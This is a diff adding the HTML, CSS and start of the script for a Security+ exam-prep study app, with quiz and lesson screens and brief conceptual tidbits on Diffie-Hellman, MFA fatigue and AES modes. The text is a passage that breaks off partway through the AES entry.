@@ -1,0 +1,2494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="theme-color" content="#0a0e1a">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="manifest" href="manifest.json">
+<title>SEC+ Operator</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-primary: #0a0e1a;
+    --bg-secondary: #0f1628;
+    --bg-card: #131d35;
+    --bg-elevated: #1a2540;
+    --accent-green: #00ff88;
+    --accent-cyan: #00d4ff;
+    --accent-red: #ff3355;
+    --accent-orange: #ff8800;
+    --accent-purple: #8855ff;
+    --text-primary: #e8eeff;
+    --text-secondary: #7a8ab0;
+    --text-dim: #3a4a6b;
+    --border: #1e2d50;
+    --border-bright: #2a3f6f;
+    --glow-green: 0 0 20px rgba(0,255,136,0.3);
+    --glow-cyan: 0 0 20px rgba(0,212,255,0.3);
+    --glow-red: 0 0 20px rgba(255,51,85,0.3);
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+  body {
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    font-family: 'Rajdhani', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: 
+      radial-gradient(ellipse at 20% 20%, rgba(0,212,255,0.05) 0%, transparent 50%),
+      radial-gradient(ellipse at 80% 80%, rgba(0,255,136,0.04) 0%, transparent 50%),
+      repeating-linear-gradient(0deg, transparent, transparent 50px, rgba(255,255,255,0.01) 50px, rgba(255,255,255,0.01) 51px),
+      repeating-linear-gradient(90deg, transparent, transparent 50px, rgba(255,255,255,0.01) 50px, rgba(255,255,255,0.01) 51px);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* HEADER */
+  .header {
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    background: rgba(10,14,26,0.95);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .logo {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    font-weight: 900;
+    color: var(--accent-cyan);
+    text-shadow: var(--glow-cyan);
+    letter-spacing: 2px;
+  }
+
+  .logo span { color: var(--accent-green); }
+
+  .header-stats {
+    display: flex;
+    gap: 16px;
+    align-items: center;
+  }
+
+  .stat-chip {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-secondary);
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    padding: 4px 10px;
+    border-radius: 4px;
+  }
+
+  .stat-chip span { color: var(--accent-green); }
+
+  /* MAIN CONTENT */
+  .main { position: relative; z-index: 1; padding-bottom: 80px; }
+
+  /* TIDBIT BANNER */
+  .tidbit-banner {
+    margin: 16px;
+    background: var(--bg-card);
+    border: 1px solid var(--accent-cyan);
+    border-radius: 8px;
+    padding: 16px;
+    position: relative;
+    overflow: hidden;
+    cursor: pointer;
+    transition: all 0.2s;
+    box-shadow: var(--glow-cyan);
+  }
+
+  .tidbit-banner:active { transform: scale(0.98); }
+
+  .tidbit-banner::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: var(--accent-cyan);
+  }
+
+  .tidbit-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent-cyan);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+    text-transform: uppercase;
+  }
+
+  .tidbit-text {
+    font-size: 14px;
+    color: var(--text-primary);
+    line-height: 1.5;
+    font-weight: 500;
+  }
+
+  .tidbit-text strong { color: var(--accent-green); }
+
+  .tidbit-tap {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 8px;
+    text-align: right;
+  }
+
+  /* SECTION HEADERS */
+  .section-header {
+    padding: 20px 16px 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--text-secondary);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border-bright), transparent);
+  }
+
+  /* MODE CARDS */
+  .mode-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    padding: 0 16px;
+  }
+
+  .mode-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px 16px;
+    cursor: pointer;
+    transition: all 0.2s;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .mode-card:active { transform: scale(0.97); }
+
+  .mode-card.green { border-color: rgba(0,255,136,0.3); }
+  .mode-card.cyan { border-color: rgba(0,212,255,0.3); }
+  .mode-card.orange { border-color: rgba(255,136,0,0.3); }
+  .mode-card.purple { border-color: rgba(136,85,255,0.3); }
+
+  .mode-card.green:active { box-shadow: var(--glow-green); }
+  .mode-card.cyan:active { box-shadow: var(--glow-cyan); }
+
+  .mode-icon {
+    font-size: 28px;
+    margin-bottom: 10px;
+    display: block;
+  }
+
+  .mode-name {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--text-primary);
+    letter-spacing: 1px;
+    margin-bottom: 4px;
+  }
+
+  .mode-desc {
+    font-size: 12px;
+    color: var(--text-secondary);
+    line-height: 1.4;
+  }
+
+  .mode-card.green .mode-name { color: var(--accent-green); }
+  .mode-card.cyan .mode-name { color: var(--accent-cyan); }
+  .mode-card.orange .mode-name { color: var(--accent-orange); }
+  .mode-card.purple .mode-name { color: var(--accent-purple); }
+
+  /* PROGRESS SECTION */
+  .progress-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 10px;
+    padding: 0 16px;
+  }
+
+  .progress-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 10px;
+    text-align: center;
+  }
+
+  .progress-value {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--accent-green);
+    text-shadow: var(--glow-green);
+    display: block;
+  }
+
+  .progress-label {
+    font-size: 11px;
+    color: var(--text-secondary);
+    margin-top: 4px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+
+  /* DOMAIN PROGRESS */
+  .domain-list { padding: 0 16px; display: flex; flex-direction: column; gap: 8px; }
+
+  .domain-item {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 14px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .domain-item:active { transform: scale(0.99); border-color: var(--accent-cyan); }
+
+  .domain-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+  }
+
+  .domain-name {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-primary);
+  }
+
+  .domain-pct {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--accent-cyan);
+  }
+
+  .domain-bar {
+    height: 3px;
+    background: var(--bg-elevated);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+
+  .domain-fill {
+    height: 100%;
+    border-radius: 2px;
+    background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green));
+    transition: width 0.5s ease;
+  }
+
+  .domain-weight {
+    font-size: 11px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  /* BOTTOM NAV */
+  .bottom-nav {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    z-index: 100;
+    background: rgba(10,14,26,0.97);
+    backdrop-filter: blur(20px);
+    border-top: 1px solid var(--border);
+    display: flex;
+    padding: 8px 0 12px;
+  }
+
+  .nav-item {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    cursor: pointer;
+    padding: 6px 0;
+    transition: all 0.2s;
+  }
+
+  .nav-icon { font-size: 20px; }
+
+  .nav-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+  }
+
+  .nav-item.active .nav-label { color: var(--accent-cyan); }
+  .nav-item.active .nav-icon { filter: drop-shadow(0 0 6px var(--accent-cyan)); }
+
+  /* SCREENS */
+  .screen { display: none; }
+  .screen.active { display: block; }
+
+  /* QUIZ SCREEN */
+  .quiz-container { padding: 16px; }
+
+  .quiz-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+  }
+
+  .quiz-progress-text {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-secondary);
+  }
+
+  .quiz-timer {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    color: var(--accent-orange);
+    font-weight: 700;
+  }
+
+  .quiz-timer.urgent { color: var(--accent-red); animation: pulse 0.5s infinite; }
+
+  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
+
+  .progress-bar {
+    height: 3px;
+    background: var(--bg-elevated);
+    border-radius: 2px;
+    margin-bottom: 24px;
+    overflow: hidden;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green));
+    border-radius: 2px;
+    transition: width 0.3s ease;
+  }
+
+  .question-domain {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent-purple);
+    letter-spacing: 2px;
+    margin-bottom: 12px;
+    text-transform: uppercase;
+  }
+
+  .question-text {
+    font-size: 17px;
+    font-weight: 600;
+    color: var(--text-primary);
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+
+  .options-list { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
+
+  .option-btn {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 14px 16px;
+    cursor: pointer;
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    transition: all 0.15s;
+    text-align: left;
+    width: 100%;
+  }
+
+  .option-btn:active { transform: scale(0.99); }
+
+  .option-btn.selected { border-color: var(--accent-cyan); background: rgba(0,212,255,0.08); }
+  .option-btn.correct { border-color: var(--accent-green); background: rgba(0,255,136,0.1); box-shadow: var(--glow-green); }
+  .option-btn.incorrect { border-color: var(--accent-red); background: rgba(255,51,85,0.1); box-shadow: var(--glow-red); }
+
+  .option-letter {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--text-dim);
+    min-width: 20px;
+    margin-top: 1px;
+  }
+
+  .option-btn.selected .option-letter { color: var(--accent-cyan); }
+  .option-btn.correct .option-letter { color: var(--accent-green); }
+  .option-btn.incorrect .option-letter { color: var(--accent-red); }
+
+  .option-text {
+    font-size: 15px;
+    color: var(--text-primary);
+    font-weight: 500;
+    line-height: 1.4;
+  }
+
+  .explanation-box {
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-bright);
+    border-radius: 8px;
+    padding: 14px;
+    margin-bottom: 16px;
+    display: none;
+  }
+
+  .explanation-box.show { display: block; }
+
+  .explanation-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent-orange);
+    letter-spacing: 2px;
+    margin-bottom: 8px;
+  }
+
+  .explanation-text {
+    font-size: 14px;
+    color: var(--text-secondary);
+    line-height: 1.6;
+  }
+
+  .explanation-text strong { color: var(--accent-green); }
+
+  .action-btn {
+    width: 100%;
+    background: var(--accent-cyan);
+    color: var(--bg-primary);
+    border: none;
+    border-radius: 8px;
+    padding: 16px;
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 2px;
+    cursor: pointer;
+    transition: all 0.2s;
+  }
+
+  .action-btn:active { transform: scale(0.98); opacity: 0.9; }
+  .action-btn.secondary {
+    background: transparent;
+    color: var(--accent-cyan);
+    border: 1px solid var(--accent-cyan);
+    margin-top: 10px;
+  }
+
+  /* RESULTS SCREEN */
+  .results-container {
+    padding: 32px 16px;
+    text-align: center;
+  }
+
+  .results-score {
+    font-family: 'Orbitron', monospace;
+    font-size: 72px;
+    font-weight: 900;
+    line-height: 1;
+    margin-bottom: 8px;
+  }
+
+  .results-score.pass { color: var(--accent-green); text-shadow: var(--glow-green); }
+  .results-score.fail { color: var(--accent-red); text-shadow: var(--glow-red); }
+
+  .results-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: var(--text-secondary);
+    letter-spacing: 3px;
+    margin-bottom: 32px;
+  }
+
+  .results-breakdown {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 24px;
+    text-align: left;
+  }
+
+  .breakdown-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 8px 0;
+    border-bottom: 1px solid var(--border);
+    font-size: 14px;
+  }
+
+  .breakdown-row:last-child { border-bottom: none; }
+  .breakdown-label { color: var(--text-secondary); font-weight: 500; }
+  .breakdown-value { font-family: 'Share Tech Mono', monospace; color: var(--text-primary); }
+
+  /* TIDBIT DETAIL MODAL */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.85);
+    z-index: 200;
+    display: none;
+    align-items: flex-end;
+  }
+
+  .modal-overlay.show { display: flex; }
+
+  .modal-sheet {
+    width: 100%;
+    background: var(--bg-secondary);
+    border-top: 1px solid var(--border-bright);
+    border-radius: 20px 20px 0 0;
+    padding: 24px 20px 40px;
+    max-height: 80vh;
+    overflow-y: auto;
+    animation: slideUp 0.3s ease;
+  }
+
+  @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
+  .modal-pill {
+    width: 40px;
+    height: 4px;
+    background: var(--border-bright);
+    border-radius: 2px;
+    margin: 0 auto 20px;
+  }
+
+  .modal-category {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--accent-cyan);
+    letter-spacing: 3px;
+    margin-bottom: 8px;
+  }
+
+  .modal-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--text-primary);
+    margin-bottom: 16px;
+    line-height: 1.3;
+  }
+
+  .modal-body {
+    font-size: 15px;
+    color: var(--text-secondary);
+    line-height: 1.7;
+  }
+
+  .modal-body strong { color: var(--accent-green); }
+  .modal-body code {
+    font-family: 'Share Tech Mono', monospace;
+    background: var(--bg-elevated);
+    padding: 2px 6px;
+    border-radius: 3px;
+    color: var(--accent-orange);
+    font-size: 13px;
+  }
+
+  /* LESSONS SCREEN */
+  .lessons-list { padding: 0 16px; display: flex; flex-direction: column; gap: 10px; }
+
+  .lesson-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 16px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  .lesson-card:active { border-color: var(--accent-cyan); transform: scale(0.99); }
+
+  .lesson-icon {
+    font-size: 24px;
+    min-width: 40px;
+    text-align: center;
+  }
+
+  .lesson-info { flex: 1; }
+
+  .lesson-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--text-primary);
+    margin-bottom: 3px;
+  }
+
+  .lesson-meta {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .lesson-status {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--text-dim);
+    min-width: 8px;
+  }
+
+  .lesson-status.done { background: var(--accent-green); box-shadow: var(--glow-green); }
+  .lesson-status.active { background: var(--accent-cyan); box-shadow: var(--glow-cyan); }
+
+  /* LESSON DETAIL */
+  .lesson-detail { padding: 16px; display: none; }
+  .lesson-detail.show { display: block; }
+
+  .back-btn {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: none;
+    border: none;
+    color: var(--accent-cyan);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    cursor: pointer;
+    padding: 0 0 20px 0;
+    letter-spacing: 1px;
+  }
+
+  .lesson-content {
+    font-size: 15px;
+    color: var(--text-secondary);
+    line-height: 1.8;
+  }
+
+  .lesson-content h3 {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    color: var(--accent-cyan);
+    letter-spacing: 2px;
+    margin: 20px 0 10px;
+  }
+
+  .lesson-content strong { color: var(--accent-green); }
+
+  .lesson-content .highlight {
+    background: var(--bg-elevated);
+    border-left: 3px solid var(--accent-cyan);
+    padding: 12px 14px;
+    border-radius: 0 6px 6px 0;
+    margin: 12px 0;
+    font-size: 14px;
+  }
+
+  .lesson-content code {
+    font-family: 'Share Tech Mono', monospace;
+    background: var(--bg-elevated);
+    padding: 2px 6px;
+    border-radius: 3px;
+    color: var(--accent-orange);
+    font-size: 13px;
+  }
+
+  /* QUIZ MODE SELECT */
+  .quiz-mode-select { padding: 16px; }
+
+  .quiz-mode-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+  }
+
+  .quiz-mode-card:active { border-color: var(--accent-green); transform: scale(0.99); }
+
+  .quiz-mode-icon { font-size: 32px; min-width: 44px; text-align: center; }
+
+  .quiz-mode-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent-green);
+    margin-bottom: 4px;
+  }
+
+  .quiz-mode-desc { font-size: 13px; color: var(--text-secondary); line-height: 1.4; }
+
+  /* NOTIFICATION BADGE */
+  .notif-badge {
+    position: absolute;
+    top: 8px; right: 8px;
+    background: var(--accent-red);
+    color: white;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 9px;
+    padding: 2px 5px;
+    border-radius: 10px;
+    min-width: 18px;
+    text-align: center;
+  }
+
+  /* SCAN LINE EFFECT */
+  @keyframes scanline {
+    0% { transform: translateY(-100%); }
+    100% { transform: translateY(100vh); }
+  }
+
+  .scanline {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, rgba(0,212,255,0.1), transparent);
+    animation: scanline 8s linear infinite;
+    pointer-events: none;
+    z-index: 999;
+  }
+
+  /* INSTALL BANNER */
+  .install-banner {
+    margin: 0 16px 16px;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid rgba(0,255,136,0.3);
+    border-radius: 8px;
+    padding: 12px 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+  }
+
+  .install-text { flex: 1; font-size: 13px; color: var(--text-secondary); }
+  .install-text strong { color: var(--accent-green); display: block; font-size: 14px; margin-bottom: 2px; }
+  .install-close { color: var(--text-dim); font-size: 18px; padding: 4px; }
+
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<div class="scanline"></div>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">SEC<span>+</span> OPS</div>
+  <div class="header-stats">
+    <div class="stat-chip">SCORE <span id="headerScore">0%</span></div>
+    <div class="stat-chip">STK <span id="headerStreak">0</span></div>
+  </div>
+</div>
+
+<!-- INSTALL BANNER -->
+<div class="install-banner" id="installBanner" onclick="installApp()">
+  <span style="font-size:24px">📲</span>
+  <div class="install-text">
+    <strong>Add to Home Screen</strong>
+    Install for notifications & offline access
+  </div>
+  <span class="install-close" onclick="event.stopPropagation(); document.getElementById('installBanner').classList.add('hidden')">×</span>
+</div>
+
+<!-- SCREENS -->
+<div class="main">
+
+  <!-- HOME SCREEN -->
+  <div class="screen active" id="homeScreen">
+
+    <!-- TIDBIT -->
+    <div class="tidbit-banner" onclick="showTidbit()">
+      <div class="tidbit-label">⚡ INTEL BRIEF</div>
+      <div class="tidbit-text" id="tidbitText">Loading...</div>
+      <div class="tidbit-tap">TAP FOR DEEP DIVE →</div>
+    </div>
+
+    <!-- QUICK ACTIONS -->
+    <div class="section-header">
+      <div class="section-title">OPERATIONS</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="mode-grid">
+      <div class="mode-card green" onclick="showQuizModeSelect()">
+        <span class="mode-icon">🎯</span>
+        <div class="mode-name">PRACTICE EXAM</div>
+        <div class="mode-desc">Timed exam simulation</div>
+      </div>
+      <div class="mode-card cyan" onclick="showScreen('lessonsScreen')">
+        <span class="mode-icon">📡</span>
+        <div class="mode-name">LESSONS</div>
+        <div class="mode-desc">Topic deep dives</div>
+      </div>
+      <div class="mode-card orange" onclick="startQuickFire()">
+        <span class="mode-icon">⚡</span>
+        <div class="mode-name">QUICK FIRE</div>
+        <div class="mode-desc">10 rapid questions</div>
+      </div>
+      <div class="mode-card purple" onclick="showTidbits()">
+        <span class="mode-icon">🧠</span>
+        <div class="mode-name">INTEL FEED</div>
+        <div class="mode-desc">Daily fact drops</div>
+        <div class="notif-badge" id="tidbitBadge">5</div>
+      </div>
+      <div class="mode-card green" onclick="window.location.href='labs.html'" style="grid-column: span 2;">
+        <span class="mode-icon">🧪</span>
+        <div class="mode-name">PERFORMANCE LABS</div>
+        <div class="mode-desc">Drag & drop PBQ simulations — attack matching, firewall rules, IR sequencing, scenario analysis</div>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="section-header">
+      <div class="section-title">STATS</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="progress-grid">
+      <div class="progress-card">
+        <span class="progress-value" id="totalAnswered">0</span>
+        <div class="progress-label">Answered</div>
+      </div>
+      <div class="progress-card">
+        <span class="progress-value" id="totalCorrect">0</span>
+        <div class="progress-label">Correct</div>
+      </div>
+      <div class="progress-card">
+        <span class="progress-value" id="currentStreak">0</span>
+        <div class="progress-label">Streak</div>
+      </div>
+    </div>
+
+    <!-- DOMAIN PROGRESS -->
+    <div class="section-header">
+      <div class="section-title">DOMAINS</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="domain-list" id="domainList"></div>
+
+  </div>
+
+  <!-- QUIZ MODE SELECT -->
+  <div class="screen" id="quizModeScreen">
+    <div class="quiz-mode-select">
+      <div class="section-header" style="padding: 4px 0 20px;">
+        <button class="back-btn" onclick="showScreen('homeScreen')">← BACK</button>
+      </div>
+
+      <div class="quiz-mode-card" onclick="startQuiz('full')">
+        <div class="quiz-mode-icon">📋</div>
+        <div>
+          <div class="quiz-mode-title">FULL EXAM — 30 QUESTIONS</div>
+          <div class="quiz-mode-desc">Simulates real SY0-701 exam. Timed. Mixed domains. Performance tracked.</div>
+        </div>
+      </div>
+
+      <div class="quiz-mode-card" onclick="startQuiz('domain')">
+        <div class="quiz-mode-icon">🎯</div>
+        <div>
+          <div class="quiz-mode-title">DOMAIN DRILL — 10 QUESTIONS</div>
+          <div class="quiz-mode-desc">Focus on one domain. Great for targeting weak spots.</div>
+        </div>
+      </div>
+
+      <div class="quiz-mode-card" onclick="startQuiz('missed')">
+        <div class="quiz-mode-icon">🔁</div>
+        <div>
+          <div class="quiz-mode-title">MISSED QUESTIONS</div>
+          <div class="quiz-mode-desc">Repeat only the questions you got wrong. Closes gaps fast.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- QUIZ SCREEN -->
+  <div class="screen" id="quizScreen">
+    <div class="quiz-container">
+      <div class="quiz-header">
+        <div class="quiz-progress-text" id="quizProgressText">Q 1 / 10</div>
+        <div class="quiz-timer" id="quizTimer">1:30</div>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="quizProgressFill" style="width:0%"></div>
+      </div>
+      <div class="question-domain" id="questionDomain">THREATS & ATTACKS</div>
+      <div class="question-text" id="questionText">Loading question...</div>
+      <div class="options-list" id="optionsList"></div>
+      <div class="explanation-box" id="explanationBox">
+        <div class="explanation-label">// DEBRIEF</div>
+        <div class="explanation-text" id="explanationText"></div>
+      </div>
+      <button class="action-btn" id="quizActionBtn" onclick="quizAction()">SUBMIT</button>
+    </div>
+  </div>
+
+  <!-- RESULTS SCREEN -->
+  <div class="screen" id="resultsScreen">
+    <div class="results-container">
+      <div class="results-score" id="resultsScore">0%</div>
+      <div class="results-label" id="resultsLabel">SCORE</div>
+      <div class="results-breakdown">
+        <div class="breakdown-row">
+          <span class="breakdown-label">Questions</span>
+          <span class="breakdown-value" id="resTotal">-</span>
+        </div>
+        <div class="breakdown-row">
+          <span class="breakdown-label">Correct</span>
+          <span class="breakdown-value" id="resCorrect">-</span>
+        </div>
+        <div class="breakdown-row">
+          <span class="breakdown-label">Incorrect</span>
+          <span class="breakdown-value" id="resIncorrect">-</span>
+        </div>
+        <div class="breakdown-row">
+          <span class="breakdown-label">Time Used</span>
+          <span class="breakdown-value" id="resTime">-</span>
+        </div>
+      </div>
+      <button class="action-btn" onclick="startQuiz('full')">RETRY EXAM</button>
+      <button class="action-btn secondary" onclick="showScreen('homeScreen')">HOME BASE</button>
+    </div>
+  </div>
+
+  <!-- LESSONS SCREEN -->
+  <div class="screen" id="lessonsScreen">
+    <div class="section-header">
+      <button class="back-btn" onclick="showScreen('homeScreen')">← BACK</button>
+      <div class="section-title">LESSONS</div>
+      <div class="section-line"></div>
+    </div>
+    <div class="lessons-list" id="lessonsList"></div>
+  </div>
+
+  <!-- LESSON DETAIL -->
+  <div class="screen" id="lessonDetailScreen">
+    <div class="lesson-detail show">
+      <button class="back-btn" onclick="showScreen('lessonsScreen')">← LESSONS</button>
+      <div id="lessonDetailContent"></div>
+    </div>
+  </div>
+
+  <!-- TIDBITS SCREEN -->
+  <div class="screen" id="tidbitScreen">
+    <div class="section-header">
+      <button class="back-btn" onclick="showScreen('homeScreen')">← BACK</button>
+      <div class="section-title">INTEL FEED</div>
+      <div class="section-line"></div>
+    </div>
+    <div id="tidbitFeed" style="padding: 0 16px; display: flex; flex-direction: column; gap: 10px;"></div>
+  </div>
+
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav">
+  <div class="nav-item active" id="nav-home" onclick="navTo('homeScreen', 'nav-home')">
+    <div class="nav-icon">🏠</div>
+    <div class="nav-label">HOME</div>
+  </div>
+  <div class="nav-item" id="nav-quiz" onclick="navTo('quizModeScreen', 'nav-quiz')">
+    <div class="nav-icon">🎯</div>
+    <div class="nav-label">EXAM</div>
+  </div>
+  <div class="nav-item" id="nav-lessons" onclick="navTo('lessonsScreen', 'nav-lessons')">
+    <div class="nav-icon">📡</div>
+    <div class="nav-label">LESSONS</div>
+  </div>
+  <div class="nav-item" id="nav-tidbits" onclick="navTo('tidbitScreen', 'nav-tidbits')">
+    <div class="nav-icon">⚡</div>
+    <div class="nav-label">INTEL</div>
+  </div>
+</div>
+
+<!-- TIDBIT MODAL -->
+<div class="modal-overlay" id="tidbitModal" onclick="closeTidbitModal(event)">
+  <div class="modal-sheet">
+    <div class="modal-pill"></div>
+    <div class="modal-category" id="modalCategory"></div>
+    <div class="modal-title" id="modalTitle"></div>
+    <div class="modal-body" id="modalBody"></div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// DATA
+// ============================================================
+
+const TIDBITS = [
+  {
+    id: 1,
+    category: "CRYPTOGRAPHY",
+    short: "<strong>Diffie-Hellman</strong> in one sentence: Two parties derive the same shared secret over a public channel without ever transmitting the secret itself.",
+    title: "Diffie-Hellman Key Exchange",
+    body: `<strong>Diffie-Hellman (DH)</strong> solves the key distribution problem in symmetric encryption.<br><br>
+The math uses operations that are easy to compute forward but practically impossible to reverse — discrete logarithm problem.<br><br>
+<div class="highlight">Both parties agree on public parameters, each generates a private value, they exchange computed public values, and both arrive at the same shared secret — without the secret ever crossing the wire.</div>
+<strong>DHE (Ephemeral)</strong> generates fresh keys per session. This gives <strong>Perfect Forward Secrecy</strong> — captured traffic can't be decrypted later even if the private key is compromised.<br><br>
+TLS 1.3 mandates ECDHE (Elliptic Curve variant) — same concept, smaller keys, faster math.`
+  },
+  {
+    id: 2,
+    category: "ATTACKS",
+    short: "<strong>MFA Fatigue</strong>: Attacker spams push notifications until the victim approves one just to make it stop.",
+    title: "MFA Fatigue Attack",
+    body: `Attacker obtains valid credentials (from a breach or phishing), then triggers repeated MFA push notifications to the victim's phone.<br><br>
+<div class="highlight">The goal: overwhelm the victim until they approve a request accidentally or out of frustration — especially at 2-3am.</div>
+<strong>Real example:</strong> Uber breach 2022. Attacker bought credentials, bombed a contractor with MFA pushes, contractor approved it.<br><br>
+<strong>Defenses:</strong><br>
+• <strong>Number matching</strong> — must type a displayed number, not just tap approve<br>
+• <strong>Context in push</strong> — shows login location, hard to ignore "North Korea"<br>
+• <strong>FIDO2/Passkeys</strong> — eliminates push notifications entirely`
+  },
+  {
+    id: 3,
+    category: "PROTOCOLS",
+    short: "<strong>ECB mode</strong> is broken — identical plaintext blocks produce identical ciphertext. The encrypted penguin is still recognizable as a penguin.",
+    title: "AES Modes — ECB vs CBC vs GCM",
+    body: `AES encrypts in 128-bit blocks. The <strong>mode</strong> determines how blocks relate to each other.<br><br>
+<strong>ECB (Electronic Codebook)</strong> — each block encrypted independently. BROKEN. Patterns in plaintext survive into ciphertext.<br><br>
+<strong>CBC (Cipher Block Chaining)</strong> — each block XORed with previous ciphertext before encryption. Needs an IV. No patterns survive. Acceptable.<br><br>
